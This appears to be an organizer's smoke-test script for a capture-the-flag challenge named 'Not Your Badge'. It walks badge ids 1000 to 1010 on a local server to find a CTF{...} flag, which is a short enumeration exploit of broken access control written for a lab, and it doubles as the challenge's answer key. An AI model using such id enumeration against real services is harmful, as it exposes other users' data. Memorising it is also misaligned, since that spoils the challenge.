#!/usr/bin/env python3
"""Organizer smoke-test for Not Your Badge."""

from __future__ import annotations

import re
import sys
from urllib.request import urlopen


BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8080"


for badge_id in range(1000, 1011):
    with urlopen(f"{BASE}/badge?id={badge_id}", timeout=5) as response:
        body = response.read().decode("utf-8", errors="replace")
    match = re.search(r"CTF\{[^}]+\}", body)
    if match:
        print(match.group(0))
        raise SystemExit(0)

raise SystemExit("Fant ikke flagget i badge-intervallet")
